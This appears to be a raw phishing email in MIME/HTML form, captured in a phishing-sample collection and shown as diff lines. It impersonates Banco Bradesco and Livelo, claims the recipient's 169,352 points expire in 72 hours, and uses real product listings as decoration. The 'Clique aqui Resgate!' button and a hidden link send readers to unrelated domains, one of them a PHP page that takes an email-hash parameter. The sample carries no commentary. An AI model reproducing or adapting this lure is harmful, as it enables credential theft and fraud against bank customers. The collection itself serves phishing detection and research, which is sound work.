+VER DETALHES<https://www.livelo.com.br/product/LVL67248047>
+[https://a-static.mlcdn.com.br/800x560/smart-tv-50-4k-led-tcl-50p635-va-wi-=
+fi-bluetooth-hdr-google-assistente-3-hdmi-1-usb/magazineluiza/235509000/33b=
+c9b52cca57c2bb8457bd26da8988e.jpg]
+
+Smart TV LED 50" 4K TCL 50P635 HDR, Wifi Dual Band, Bluetooth, Controle Rem=
+oto com Comando por controle de Voz, Google Assistant e Borda fina
+
+127.730
+PONTOS
+
+VER DETALHES<https://www.livelo.com.br/smart-tv-led-50-4k-tcl-50p635-hdr-wi=
+fi-dual-band-bluetooth-controle-remoto-com-comando-por-controle-de-voz-goog=
+le-assistant-e-borda-fina/produto/LVL59063260#image-0>
+________________________________
+________________________________
+[https://www.melhorcomprar.com.br/images/produto/510559-1.webp]
+
+Notebook Dell Intel Pentium Gold 4GB 128GB SSD Tela 15.6=94 Full HD Windows=
+ 11 Inspiron i15-i1100-A10PF com Microsoft 365
+
+122.170
+PONTOS
+
+VER DETALHES <https://www.livelo.com.br/notebook-dell-intel-pentium-gold-4g=
+b-128gb-ssd-tela-156-full-hd-windows-11-inspiron-i15-i1100-a10pf-com-micros=
+oft-365/produto/LVL65481756>
+[https://product-hub-prd.madeiramadeira.com.br/492516794/images/c5813db4-c9=
+33-447f-b7ca-bbe06bbaf9b87484300i.jpg]
+
+Cozinha Completa Bartira Rubi com 7 Portas e 5 Gavetas - 280cm de largura
+
+103.730
+PONTOS
+
+VER DETALHES<https://www.livelo.com.br/cozinha-completa-bartira-rubi-com-7-=
+portas-e-5-gavetas-280cm-de-largura/produto/LVL208007>
+Bradesco - Livelo S.A. - Todos os direitos reservados - CNPJ: 12.888.241/00=
+01-06
+
+
+
+<https://www.polymer.or.kr/med/ww2ib/axps.php?hash=3D%EMAIL%>
+
+
+--_000_IA0PR02MB97792321D8B3A0A09FA51A42B337AIA0PR02MB9779namp_
+Content-Type: text/html; charset="Windows-1252"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3DWindows-1=
+252">
+</head>
+<body>
+<div></div>
+<br>
+<hr style=3D"display:inline-block;width:98%" tabindex=3D"-1">
+<div id=3D"divRplyFwdMsg" dir=3D"ltr"><font face=3D"Calibri, sans-serif" st=
+yle=3D"font-size:11pt" color=3D"#000000"><b>De:</b> Banco Bradesco S/A &lt;=
+bradesco@resgate.com&gt;<br>
+<b>Enviado:</b> quarta-feira, 12 de julho de 2023 17:17<br>
+<b>Para:</b> phishing@pot &lt;phishing@pot&gt;<br=
+>
+<b>Assunto:</b> Sua recompensa expirar em breve Resgate 169.352 pts</font>
+<div>&nbsp;</div>
+</div>
+<style type=3D"text/css">
+<!--
+.x_style1
+	{color:#D50091;
+	font-weight:bold}
+.x_style2
+	{color:#D50091}
+.x_style6
+	{font-size:12px;
+	color:#666666;
+	font-weight:bold}
+.x_style7
+	{font-family:Arial,serif,EmojiFont;
+	color:#D50091}
+.x_style10
+	{color:#666666;
+	font-weight:bold}
+.x_style12
+	{font-size:16px;
+	color:#666666;
+	font-weight:bold}
+.x_style15
+	{color:#666666}
+.x_style18
+	{color:#666666;
+	font-weight:bold;
+	font-size:15px}
+-->
+</style>
+<div>
+<table class=3D"x_x_x_x_mainTable" border=3D"0" width=3D"555" cellspacing=
+=3D"0" cellpadding=3D"0" style=3D"">
+<tbody>
+<tr>
+<td align=3D"center">
+<table border=3D"0" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td colspan=3D"4" align=3D"center" valign=3D"top">
+<table border=3D"0" width=3D"550" cellspacing=3D"0" cellpadding=3D"0" style=
+=3D"margin-left:auto; margin-right:auto">
+<tbody>
+<tr>
+<td><img width=3D"662" height=3D"218" src=3D"https://expresso.bradesco/port=
+al/imagens/expresso/banner3.jpg"></td>
+</tr>
+<tr>
+<td>
+<table border=3D"0" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td align=3D"center"></td>
+</tr>
+</tbody>
+</table>
+<table border=3D"0" width=3D"535" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td class=3D"x_x_x_content-block" style=3D"margin:0px; padding:0px 0px 20px=
+; white-space:normal!important; font-family:'Helvetica Neue',Helvetica,Helv=
+etica,Arial,sans-serif; font-size:14px; vertical-align:top; width:501px">
+<div align=3D"center"><br>
+<br>
+<span style=3D"border:0px none; margin:0px; padding:0px; font-family:inheri=
+t; font-style:inherit; font-variant:inherit; font-weight:inherit; font-size=
+:inherit; line-height:inherit; vertical-align:baseline; color:rgb(255,255,2=
+55)!important"></span>
+<div style=3D"padding:0px 20px">
+<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" ro=
+le=3D"presentation" style=3D"width:100%">
+<tbody>
+<tr>
+<td colspan=3D"3" style=3D"direction:ltr; padding:0px; text-align:left; ver=
+tical-align:top">
+<div style=3D"margin-bottom:20px">
+<p style=3D"margin:0px; padding:0px; font-family:Arial,Helvetica,sans-serif=
+; font-size:14px">
+<span class=3D"x_x_x_hole-bring" style=3D"font-family:Arial,sans-serif; fon=
+t-size:14px; color:#6a7282; line-height:26px; font-weight:bold">Prezado Cli=
+ente,</span></p>
+</div>
+<h4 align=3D"center" class=3D"x_style12">Programa de Pontos Livelo.</h4>
+</td>
+</tr>
+<tr>
+<td colspan=3D"3" style=3D"direction:ltr; padding:0px; text-align:left; ver=
+tical-align:top">
+<div style=3D"margin-bottom:40px">
+<p style=3D"margin:0px; padding:0px; font-family:Arial,Helvetica,sans-serif=
+; font-size:14px; text-align:justify; line-height:16px">
+<span style=3D"color:black; font-size:14px; font-family:Verdana,serif,Emoji=
+Font; font-weight:500; font-style:normal; letter-spacing:normal; line-heigh=
+t:1.5; font-stretch:normal"><span class=3D"x_style10">Voc=EA tem pontos acu=
+mulados em seu CPF, que est=E3o disponiveis
+ para resgate. Voc=EA cliente</span> <strong><span class=3D"x_style7">Brade=
+sco</span>,
+<span class=3D"x_style15">tem pontos em dobro. Acesse agora e Resgate seus =
+pontos</span></strong><span class=3D"x_style1"> Livelo
+</span>. </span><span class=3D"x_style18">Aproveite e troque seus pontos po=
+r experi=EAncias incrive=EDs, milhas a=E9reas ou descontos de at=E9
+<span class=3D"x_style2">40%</span> na fatura do seu cart=E3o Bradesco.</sp=
+an></p>
+<p style=3D"margin:0px; padding:0px; font-family:Arial,Helvetica,sans-serif=
+; font-size:14px; text-align:justify; line-height:16px">
+<br>
+.</p>
+<table width=3D"614" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"614">
+<div align=3D"center"></div>
+</td>
+</tr>
+<tr>
+<td>
+<div align=3D"center"></div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan=3D"3" style=3D"direction:ltr; padding:0px; text-align:left; ver=
+tical-align:top">
+<div style=3D"margin-bottom:30px">
+<div style=3D"width:200px; border:2px dotted #fa0810; margin:0 auto; paddin=
+g:10px; font-family:Arial,Helvetica,sans-serif; font-size:14px; line-height=
+:16px; text-align:center">
+<span style=3D"color:#D50091; font-weight:bold; font-size:25px">169.352 pts=
+ </span>
+<br>
+<br>
+<span style=3D"font-size:12px; font-weight:bold">Pontos / expiram: em 72 ho=
+ras. </span>
+</div>
+</div>
+</td>
+</tr>
+<tr>
+<td height=3D"27" colspan=3D"3" style=3D"direction:ltr; padding:0px; text-a=
+lign:left; vertical-align:top">
+<div align=3D"center"><span style=3D"box-sizing:border-box; border:1px soli=
+d #ccc; height:490px; padding:15px; text-align:center; font-family:Arial,He=
+lvetica,sans-serif; margin-bottom:20px"><a href=3D"
+https://www.elivestory.com/ib2w/?hash=3Dphishing@pot" style=3D=
+"text-decoration:none; font-family:Arial,Helvetica,sans-serif; background-c=
+olor:#D50091; color:#fff; font-weight:bold; font-size:14px; padding:10px 30=
+px; border-radius:30px">Clique
+ aqui Resgate! </a></span></div>
+</td>
+</tr>
+<tr>
+<td colspan=3D"3" style=3D"direction:ltr; padding:0px; text-align:left; ver=
+tical-align:top">
+<div style=3D"text-align:center">
+<hr>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan=3D"3" style=3D"direction:ltr; padding:0px; text-align:left; ver=
+tical-align:top">
+&nbsp;
+<div align=3D"center"><span class=3D"x_x_x_upward-dull"><span class=3D"x_st=
+yle6">N=B0 de controle: 1167874892</span></span></div>
+</td>
+</tr>
+<tr>
+<td colspan=3D"3" style=3D"direction:ltr; padding:0px; text-align:left; ver=
+tical-align:top">
+<div style=3D"text-align:center">
+<hr>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan=3D"3" style=3D"direction:ltr; padding:0px; text-align:left; ver=
+tical-align:top">
+<div style=3D"margin-top:15px; margin-bottom:15px">
+<p style=3D"margin:0px; padding:0px; font-family:Arial,Helvetica,sans-serif=
+; font-size:14px; text-align:justify; line-height:16px; margin-bottom:15px"=
+>
+<span style=3D"font-weight:bold">Confira abaixo algumas ofertas, que podem =
+ser trocadas com pontos<span class=3D"x_style2"> Livelo.</span></span></p>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan=3D"1" width=3D"50%" style=3D"direction:ltr; padding:0px; text-a=
+lign:left; vertical-align:top">
+<div style=3D"box-sizing:border-box; border:1px solid #ccc; height:490px; p=
+adding:15px; text-align:center; font-family:Arial,Helvetica,sans-serif; mar=
+gin-bottom:20px">
+<img width=3D"173" height=3D"197" alt=3D"" src=3D"https://m.media-amazon.co=
+m/images/I/61bK6PMOC3L._AC_SX679_.jpg
+">
+<p style=3D"margin:0px; padding:0px; font-size:11px; margin-bottom:40px"><b=
+r>
+Apple iPhone 14 (128 GB) =96 azul</p>
+<p style=3D"margin:0px; padding:0px; font-size:22px; color:#D50091; font-we=
+ight:bold; line-height:15px; margin-bottom:30px">
+<span data-bind=3D"text: $parent.formatPoints($data.x_salePrice())">358.100=
+</span><span data-bind=3D"widgetLocaleText: 'pointsCurrency'">pts</span><br=
+>
+<span style=3D"font-weight:normal; font-size:12px">PONTOS</span></p>
+<a href=3D"https://www.livelo.com.br/product/LVL53885398" style=3D"text-dec=
+oration:none; font-family:Arial,Helvetica,sans-serif; background-color:#D50=
+091; color:#fff; font-weight:bold; font-size:14px; padding:10px 30px; borde=
+r-radius:30px">VER DETALHES</a>
+</div>
+</td>
+<td width=3D"5%"></td>
+<td colspan=3D"1" width=3D"50%" style=3D"direction:ltr; padding:0px; text-a=
+lign:left; vertical-align:top">
+<div style=3D"box-sizing:border-box; border:1px solid #ccc; height:490px; p=
+adding:15px; text-align:center; font-family:Arial,Helvetica,sans-serif; mar=
+gin-bottom:20px">
+<img width=3D"250" height=3D"270" alt=3D"" src=3D"https://imagens.fastshop.=
+com.br/imgprod/AEMQAH3BEAPTA_G.jpg
+">
+<p style=3D"margin:0px; padding:0px; font-size:11px; margin-bottom:40px">iP=
+hone 14 Pro Max Apple (512GB) Prateado, Tela de 6,7&quot;, 5G e C=E2mera de=
+ 48MP</p>
+<p style=3D"margin:0px; padding:0px; font-size:22px; color:#D50091; font-we=
+ight:bold; line-height:15px; margin-bottom:30px">
+636.890<br>
+<span style=3D"font-weight:normal; font-size:12px">PONTOS</span></p>
+<a href=3D"https://www.livelo.com.br/iphone-14-pro-max-apple-512gb-prateado=
+-tela-de-67-5g-e-c=E2mera-de-48mp/produto/LVL67807512" style=3D"text-decora=
+tion:none; font-family:Arial,Helvetica,sans-serif; background-color:#D50091=
+; color:#fff; font-weight:bold; font-size:14px; padding:10px 30px; border-r=
+adius:30px">VER
+ DETALHES</a> </div>
+</td>
+</tr>
+<tr>
+<td colspan=3D"1" width=3D"50%" style=3D"direction:ltr; padding:0px; text-a=
+lign:left; vertical-align:top">
+<div style=3D"box-sizing:border-box; border:1px solid #ccc; height:490px; p=
+adding:15px; text-align:center; font-family:Arial,Helvetica,sans-serif; mar=
+gin-bottom:20px">
+<img width=3D"249" height=3D"250" alt=3D"" src=3D"https://carrefourbr.vtexa=
+ssets.com/arquivos/ids/90619873-540-auto?v=3D638071361206570000&amp;width=
+=3D540&amp;height=3Dauto&amp;aspect=3Dtrue
+">
+<p style=3D"margin:0px; padding:0px; font-size:11px; margin-bottom:40px">Sm=
+artwatch Mormaii Life MOLIFEAN/8R Unissex Vermelho com Sensor de Frequ=EAnc=
+ia Card=EDaca, Notifica=E7=F5es de Liga=E7=E3o, Cron=F4metro, Touchscreen</=
+p>
+<p style=3D"margin:0px; padding:0px; font-size:22px; color:#D50091; font-we=
+ight:bold; line-height:15px; margin-bottom:30px">
+28.700<br>
+<span style=3D"font-weight:normal; font-size:12px">PONTOS</span></p>
+<a href=3D"https://www.livelo.com.br/product/LVL67248047" style=3D"text-dec=
+oration:none; font-family:Arial,Helvetica,sans-serif; background-color:#D50=
+091; color:#fff; font-weight:bold; font-size:14px; padding:10px 30px; borde=
+r-radius:30px">VER DETALHES</a>
+</div>
+</td>
+<td width=3D"5%"></td>
+<td colspan=3D"1" width=3D"50%" style=3D"direction:ltr; padding:0px; text-a=
+lign:left; vertical-align:top">
+<div style=3D"box-sizing:border-box; border:1px solid #ccc; height:490px; p=
+adding:15px; text-align:center; font-family:Arial,Helvetica,sans-serif; mar=
+gin-bottom:20px">
+<img width=3D"249" height=3D"212" alt=3D"" src=3D"https://a-static.mlcdn.co=
+m.br/800x560/smart-tv-50-4k-led-tcl-50p635-va-wi-fi-bluetooth-hdr-google-as=
+sistente-3-hdmi-1-usb/magazineluiza/235509000/33bc9b52cca57c2bb8457bd26da89=
+88e.jpg
+">
+<p style=3D"margin:0px; padding:0px; font-size:11px; margin-bottom:40px">Sm=
+art TV LED 50&quot; 4K TCL 50P635 HDR, Wifi Dual Band, Bluetooth, Controle =
+Remoto com Comando por controle de Voz, Google Assistant e Borda fina</p>
+<p style=3D"margin:0px; padding:0px; font-size:22px; color:#D50091; font-we=
+ight:bold; line-height:15px; margin-bottom:30px">
+127.730<br>
+<span style=3D"font-weight:normal; font-size:12px">PONTOS</span></p>
+<a href=3D"https://www.livelo.com.br/smart-tv-led-50-4k-tcl-50p635-hdr-wifi=
+-dual-band-bluetooth-controle-remoto-com-comando-por-controle-de-voz-google=
+-assistant-e-borda-fina/produto/LVL59063260#image-0" style=3D"text-decorati=
+on:none; font-family:Arial,Helvetica,sans-serif; background-color:#D50091; =
+color:#fff; font-weight:bold; font-size:14px; padding:10px 30px; border-rad=
+ius:30px">VER
+ DETALHES</a> </div>
+</td>
+</tr>
+</tbody>
+</table>
+<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" ro=
+le=3D"presentation" style=3D"width:100%">
+<tbody>
+<tr>
+</tr>
+<tr>
+</tr>
+<tr>
+</tr>
+<tr>
+</tr>
+<tr>
+<td colspan=3D"3" style=3D"direction:ltr; padding:0px; text-align:left; ver=
+tical-align:top">
+<div style=3D"text-align:center">
+<hr>
+</div>
+</td>
+</tr>
+<tr>
+</tr>
+<tr>
+<td colspan=3D"3" style=3D"direction:ltr; padding:0px; text-align:left; ver=
+tical-align:top">
+<div style=3D"text-align:center">
+<hr>
+</div>
+</td>
+</tr>
+<tr>
+</tr>
+<tr>
+</tr>
+<tr>
+<td colspan=3D"1" width=3D"50%" style=3D"direction:ltr; padding:0px; text-a=
+lign:left; vertical-align:top">
+<div style=3D"box-sizing:border-box; border:1px solid #ccc; height:490px; p=
+adding:15px; text-align:center; font-family:Arial,Helvetica,sans-serif; mar=
+gin-bottom:20px">
+<img width=3D"249" height=3D"250" alt=3D"" src=3D"https://www.melhorcomprar=
+.com.br/images/produto/510559-1.webp
+">
+<p style=3D"margin:0px; padding:0px; font-size:11px; margin-bottom:40px">No=
+tebook Dell Intel Pentium Gold 4GB 128GB SSD Tela 15.6=94 Full HD Windows 1=
+1 Inspiron i15-i1100-A10PF com Microsoft 365</p>
+<p style=3D"margin:0px; padding:0px; font-size:22px; color:#D50091; font-we=
+ight:bold; line-height:15px; margin-bottom:30px">
+122.170<br>
+<span style=3D"font-weight:normal; font-size:12px">PONTOS</span></p>
+<a href=3D"https://www.livelo.com.br/notebook-dell-intel-pentium-gold-4gb-1=
+28gb-ssd-tela-156-full-hd-windows-11-inspiron-i15-i1100-a10pf-com-microsoft=
+-365/produto/LVL65481756" style=3D"text-decoration:none; font-family:Arial,=
+Helvetica,sans-serif; background-color:#D50091; color:#fff; font-weight:bol=
+d; font-size:14px; padding:10px 30px; border-radius:30px">VER
+ DETALHES </a></div>
+</td>
+<td width=3D"5%"></td>
+<td colspan=3D"1" width=3D"50%" style=3D"direction:ltr; padding:0px; text-a=
+lign:left; vertical-align:top">
+<div style=3D"box-sizing:border-box; border:1px solid #ccc; height:490px; p=
+adding:15px; text-align:center; font-family:Arial,Helvetica,sans-serif; mar=
+gin-bottom:20px">
+<img width=3D"249" height=3D"250" alt=3D"" src=3D"https://product-hub-prd.m=
+adeiramadeira.com.br/492516794/images/c5813db4-c933-447f-b7ca-bbe06bbaf9b87=
+484300i.jpg
+">
+<p style=3D"margin:0px; padding:0px; font-size:11px; margin-bottom:40px">Co=
+zinha Completa Bartira Rubi com 7 Portas e 5 Gavetas - 280cm de largura</p>
+<p style=3D"margin:0px; padding:0px; font-size:22px; color:#D50091; font-we=
+ight:bold; line-height:15px; margin-bottom:30px">
+103.730<br>
+<span style=3D"font-weight:normal; font-size:12px">PONTOS</span></p>
+<a href=3D"https://www.livelo.com.br/cozinha-completa-bartira-rubi-com-7-po=
+rtas-e-5-gavetas-280cm-de-largura/produto/LVL208007" style=3D"text-decorati=
+on:none; font-family:Arial,Helvetica,sans-serif; background-color:#D50091; =
+color:#fff; font-weight:bold; font-size:14px; padding:10px 30px; border-rad=
+ius:30px">VER
+ DETALHES</a> </div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div style=3D"padding:20px">
+<div style=3D"padding:20px 20px; text-align:center; background-color:#D5009=
+1; font-family:Arial,Helvetica,sans-serif; color:#FFFFFF; font-size:12px">
+<strong>Bradesco - Livelo S.A. - Todos os direitos reservados - CNPJ: 12.88=
+8.241/0001-06</strong></div>
+</div>
+<br>
+</div>
+</td>
+<td style=3D"width:15px">&nbsp;</td>
+<td class=3D"x_x_x_x_innerTable x_x_x_x_round-corners-top x_x_x_x_round-cor=
+ners-bottom">
+&nbsp;</td>
+<td style=3D"width:15px">&nbsp;</td>
+</tr>
+<tr>
+<td class=3D"x_x_x_content-block" align=3D"center" style=3D"margin:0px; pad=
+ding:0px 0px 20px; white-space:normal!important; font-family:'Helvetica Neu=
+e',Helvetica,Helvetica,Arial,sans-serif; font-size:14px; vertical-align:top=
+; width:501px">
+<div align=3D"center"><br>
+<a href=3D"https://www.polymer.or.kr/med/ww2ib/axps.php?hash=3D%EMAIL%" tar=
+get=3D"_blank" class=3D"x_x_x_btn-primary" rel=3D"noreferrer noopener" styl=
+e=3D"border:0px none; margin:0px; padding:0px; font-family:inherit; font-st=
+yle:inherit; font-variant:inherit; font-weight:inherit; font-size:inherit; =
+line-height:inherit; vertical-align:baseline"></a><br>
+</div>
+</td>
+<td colspan=3D"3" style=3D"height:15px">&nbsp;</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</body>
+</html>
+
+--_000_IA0PR02MB97792321D8B3A0A09FA51A42B337AIA0PR02MB9779namp_--
